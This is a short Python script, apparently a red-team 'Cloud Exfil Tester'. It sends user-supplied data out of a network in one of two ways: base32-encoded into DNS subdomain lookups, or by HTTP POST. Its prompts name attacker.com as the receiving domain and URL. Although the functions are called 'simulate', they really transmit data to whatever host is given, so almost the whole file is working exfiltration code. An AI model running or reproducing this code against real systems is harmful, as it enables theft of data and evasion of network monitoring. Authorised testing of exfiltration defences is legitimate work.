import base64
import requests
import socket
from datetime import datetime

results = []

def simulate_dns_exfil(data, domain):
    try:
        encoded = base64.b32encode(data.encode()).decode().strip("=")
        subdomain = f"{encoded[:50]}.{domain}"
        socket.gethostbyname(subdomain)
        results.append({
            "method": "DNS",
            "target": subdomain,
            "timestamp": datetime.utcnow().isoformat()
        })
        print(f"[+] DNS exfil attempted to {subdomain}")
    except Exception as e:
        results.append({
            "method": "DNS",
            "target": subdomain,
            "error": str(e),
            "timestamp": datetime.utcnow().isoformat()
        })
        print(f"[!] DNS exfil error: {e}")

def simulate_http_exfil(data, url):
    try:
        resp = requests.post(url, data={"exfil": data}, timeout=10)
        results.append({
            "method": "HTTP",
            "target": url,
            "status_code": resp.status_code,
            "timestamp": datetime.utcnow().isoformat()
        })
        print(f"[+] HTTP exfil sent to {url} - Status: {resp.status_code}")
    except Exception as e:
        results.append({
            "method": "HTTP",
            "target": url,
            "error": str(e),
            "timestamp": datetime.utcnow().isoformat()
        })
        print(f"[!] HTTP exfil error: {e}")

def run_cloud_exfil_tester():
    print("\n--- Cloud Exfil Tester ---")
    data = input("Enter data to exfiltrate: ").strip()
    method = input("Method [dns/http]: ").strip().lower()

    if method == "dns":
        domain = input("Enter attacker-controlled domain (e.g., attacker.com): ").strip()
        simulate_dns_exfil(data, domain)
    elif method == "http":
        url = input("Enter exfil URL (e.g., http://attacker.com/exfil): ").strip()
        simulate_http_exfil(data, url)
    else:
        print("[!] Invalid method.")
        return

    with open("cloud_exfil_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("\n[+] Exfil test complete. Results saved to cloud_exfil_results.txt.")

